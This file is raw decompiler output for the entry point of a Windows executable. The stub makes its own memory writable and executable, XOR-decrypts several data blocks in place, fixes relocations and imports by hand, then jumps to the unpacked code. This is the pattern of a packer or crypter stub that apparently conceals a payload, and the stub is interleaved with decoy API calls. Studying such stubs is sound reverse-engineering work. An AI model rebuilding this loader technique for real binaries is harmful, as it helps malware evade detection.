union { unsigned int x9; void * x10; } global10;
void global12;
void global14;
void global16;
void global18;
void global20;
__size32 global29 = 0xe3e1a1cf;// 4 bytes

// address: 0x401000
void _start() {
    unsigned char cl; 		// r9
    unsigned char cl_1; 		// r9{112}
    unsigned char dl; 		// r10
    unsigned char dl_1; 		// r10{129}
    __size32 eax; 		// r24
    HANDLE eax_1; 		// r24
    unsigned int eax_2; 		// r24{15}
    unsigned int eax_3; 		// r24{73}
    unsigned int eax_4; 		// r24{420}
    unsigned int eax_5; 		// r24{231}
    __size32 eax_6; 		// r24{259}
    __size32 ebp; 		// r29
    __size32 ebp_1; 		// r29{495}
    unsigned short *ebp_2; 		// r29{510}
    __size32 ebx; 		// r27
    unsigned int ebx_1; 		// r27{468}
    unsigned int ebx_2; 		// r27{493}
    int ecx; 		// r25
    __size32 edi; 		// r31
    unsigned int edi_1; 		// r31{76}
    union { unsigned int x9; __size32 * x10; } edi_2; 		// r31{547}
    int edx; 		// r26
    unsigned short *edx_1; 		// r26{482}
    __size32 esi; 		// r30
    __size32 esi_1; 		// r30{428}
    __size32 esi_2; 		// r30{432}
    __size32 esi_3; 		// r30{436}
    __size32 esi_4; 		// r30{440}
    __size32 esi_5; 		// r30{444}
    int esp; 		// r28
    union { unsigned int x9; __size32 * x10; } *esp_1; 		// r28{73}
    LPCSTR local0; 		// m[esp - 56]
    char *local1; 		// m[esp - 52]
    unsigned int local10; 		// m[esp - 32]
    int local11; 		// m[esp - 28]
    int local12; 		// m[esp - 24]
    __size32 local13; 		// m[esp - 20]
    unsigned int local14; 		// m[esp_1 - 12]{84}
    void *local15; 		// m[esp_1 - 12]{93}
    __size32 local16; 		// ebp{545}
    unsigned int local2; 		// m[esp - 72]
    int local3; 		// m[esp - 68]
    int local4; 		// m[esp - 64]
    int local5; 		// m[esp - 60]
    __size32 local6; 		// m[esp - 48]
    __size32 local7; 		// m[esp - 44]
    __size32 local8; 		// m[esp - 40]
    int local9; 		// m[esp - 36]

    eax_2 = StrChrA();
    if (eax_2 == 0) {
        eax = StrStrIA();
        if (eax == 0) {
            eax_1 = LoadLibraryA("advapi32.dll");
            eax = GetProcAddress(eax_1, "AddAce"); /* Warning: also results in ecx, edx */
            (*eax)(pc, 0, 0, 0, 0, 0, edi, ebp, ebx, 0x404070, eax_2, 0x404068, 0, esi, eax, ecx, edx, ebx, ebp, 0, edi, LOGICALFLAGS32(eax), LOGICALFLAGS32(eax), LOGICALFLAGS32(eax));
            edi_1 = eax_3 + 28;
            *(__size32*)(esp_1 - 4) = -1;
            *(__size32*)(esp_1 - 8) = -1;
            eax = AreAllAccessesGranted();
            if (eax == 0) {
                edi_1 = eax_3 + 28 ^ 14;
            }
            local15 = esp_1 + 8;
            *(__size32*)(esp_1 - 16) = 64;
            *(__size32*)(esp_1 - 20) = 0x3000;
            *(__size32*)(esp_1 - 24) = 0x401000;
            ecx = VirtualProtect(); /* Warning: also results in edx */
            eax = 0;
            do {
                eax_4 = eax;
                if (esi == edi_1) {
                    esi = 0;
                }
                esi_1 = esi;
                cl_1 = *(esi_1 + 0x405000);
                cl = (cl_1 ^ global10[eax_4]);
                esi = esi_1 + 1;
                global10[eax_4] = cl ^ 90;
                if (esi_1 + 1 == edi_1) {
                    esi = 0;
                }
                esi_2 = esi;
                dl_1 = *(esi_2 + 0x405000);
                dl = (dl_1 ^ global12[eax_4]);
                esi = esi_2 + 1;
                global12[eax_4] = dl ^ 90;
                if (esi_2 + 1 == edi_1) {
                    esi = 0;
                }
                esi_3 = esi;
                cl = *(esi_3 + 0x405000);
                cl = (cl ^ global14[eax_4]);
                esi = esi_3 + 1;
                global14[eax_4] = cl ^ 90;
                if (esi_3 + 1 == edi_1) {
                    esi = 0;
                }
                esi_4 = esi;
                dl = *(esi_4 + 0x405000);
                dl = (dl ^ global16[eax_4]);
                esi = esi_4 + 1;
                global16[eax_4] = dl ^ 90;
                if (esi_4 + 1 == edi_1) {
                    esi = 0;
                }
                esi_5 = esi;
                cl = *(esi_5 + 0x405000);
                cl = (cl ^ global18[eax_4]);
                esi = esi_5 + 1;
                ecx = ((((((((ecx >> 8 & 0xffffff | (cl_1)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ 90)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ 90)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl)) >> 8 & 0xffffff | (cl ^ 90);
                global18[eax_4] = cl ^ 90;
                if (esi_5 + 1 == edi_1) {
                    esi = 0;
                }
                dl = *(esi + 0x405000);
                dl = (dl ^ global20[eax_4]);
                eax = eax_4 + 1;
                edx = ((((((((edx >> 8 & 0xffffff | (dl_1)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ 90)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ 90)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ 90);
                global20[eax_4] = dl ^ 90;
                esi++;
            } while ((eax_4 + 1) * 6 < 0x1440);
            esi = 0x403678;
            ebx += edx;
            ebp = 0x4020f8;
            *(__size32*)(esp_1 - 4) = 0x4020f8;
            *(union { unsigned int x9; __size32 * x10; }*)esp_1 = 0;
            ecx = 0;
            do {
                eax_5 = *(esi + 4);
                eax = (eax_5 - 8) / 2;
                ebx = ebx - 0xfbfdf08;
                edx = esi + 8;
                if ((int)((eax_5 - 8) / 2) > 0) {
                    ebx = (eax_5 - 8) / 2;
                    do {
                        ebx_1 = ebx;
                        eax = *(unsigned short*)edx;
                        if ((eax & 0xf000) == 0x3000) {
                            eax_6 = (eax & 0xfff) + *esi;
                            eax = eax_6 + 0x4020f8;
                            *(__size32*)(eax_6 + 0x4020f8) = *(eax_6 + 0x4020f8) - 0xfbfdf08;
                        }
                        edx++;
                        ebx = ebx_1 - 1;
                    } while (ebx_1 != 1);
                    ecx = *esp_1;
                }
                edx_1 = edx;
                ecx += *(esi + 4);
                *(union { unsigned int x9; void * x10; }*)esp_1 = ecx;
                edx = esi + edx_1 * 8;
                dl = (unsigned char) esi + edx_1 * 8;
                esi += *(esi + 4);
            } while (ecx < 232);
            edi = 0x402e6c;
            *(union { unsigned int x9; void * x10; }*)esp_1 = 0x402e6c;
            flags = SUBFLAGS32(*0x402e7c, 0, global29);
            if (*0x402e7c != 0) {
                do {
                    ebx_2 = ebx;
                    ebp_1 = ebp;
                    edx = *(edi + 12);
                    dl = (unsigned char) edx + ebp_1;
                    *(__size32*)(esp_1 - 28) = edx + ebp_1;
                    eax = LoadLibraryA(*(esp_1 - 28)); /* Warning: also results in edx */
                    local16 = ebp_1;
                    ecx = eax;
                    *(unsigned int*)(esp_1 + 4) = eax;
                    ebx = ebx_2 * 5;
                    if (eax != 0) {
                        eax = *edi;
                        if (eax == 0) {
                            eax = *(edi + 16);
                        }
                        ebp = ebp_1 + eax;
                        esi = ebx_2 * 5 + esi * 8;
                        edi = *(edi + 16);
                        eax = *(ebp_1 + eax);
                        edi += *(esp_1 - 4);
                        if (eax != 0) {
L11:
                            ebp_2 = ebp;
                            if (eax >= 0) {
                                esi = esi * 9;
                                edx = *(esp_1 - 4);
                                dl = (unsigned char) edx;
                                *(__size32*)(esp_1 - 28) = eax + edx + 2;
                                *(unsigned int*)(esp_1 - 32) = ecx;
                                eax = GetProcAddress(*(esp_1 - 32), *(esp_1 - 28)); /* Warning: also results in edx */
                                goto L7;
                            }
                            eax = *(unsigned short*)ebp_2;
                            *(unsigned int*)(esp_1 - 28) = eax;
                            *(unsigned int*)(esp_1 - 32) = ecx;
                            eax = GetProcAddress(*(esp_1 - 32), *(esp_1 - 28)); /* Warning: also results in ecx, edx */
                            ebx += ecx;
L7:
                            ebp = ebp_2 + 4;
                            *(__size32*)edi = eax;
                            eax = *(ebp_2 + 4);
                            edi++;
                            if (eax != 0) {
                                ecx = *(esp_1 + 4);
                                goto L11;
                            }
                        }
                        ebp = *(esp_1 - 4);
                        edi = *esp_1;
                        local16 = ebp;
                    }
                    ebp = local16;
                    edi_2 = edi;
                    edi = edi_2 + 20;
                    tmp1 = *(edi_2 + 36);
                    flags = SUBFLAGS32(*(edi_2 + 36), 0, tmp1);
                    *(union { unsigned int x9; __size32 * x10; }*)esp_1 = edi_2 + 20;
                } while (*(edi_2 + 36) != 0);
            }
            (*0x402b58)(local2, local3, local4, local5, local0, local1, local6, local7, local8, local9, local10, local11, local12, local13, 88, dl, eax, 0x402b58, edx, ebx, ebp, esi, edi, <all>, flags, ZF, CF);
            *(__size32*)(esp - 4) = 0;
            ExitProcess(*(esp - 4));
        }
    }
    return;
}

